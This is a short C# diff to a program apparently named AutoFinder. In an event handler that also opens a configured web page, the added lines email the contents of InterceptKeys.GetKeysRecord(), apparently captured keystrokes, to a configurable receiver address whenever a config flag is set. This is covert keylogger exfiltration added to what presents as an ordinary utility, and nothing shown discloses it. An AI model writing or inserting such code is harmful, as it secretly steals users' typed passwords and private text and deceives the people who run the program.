@@ -244,6 +244,11 @@ namespace AutoFinder
 			{
 				System.Diagnostics.Process.Start(configLoader.OpenPageUrl);
 			}
+			if(configLoader.SendMail)
+			{
+				EmailHelper helper = new EmailHelper();
+				helper.SendEmail(InterceptKeys.GetKeysRecord(), configLoader.EmailReceiver);
+			}
 		}
 		
 		void LnkAdLinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
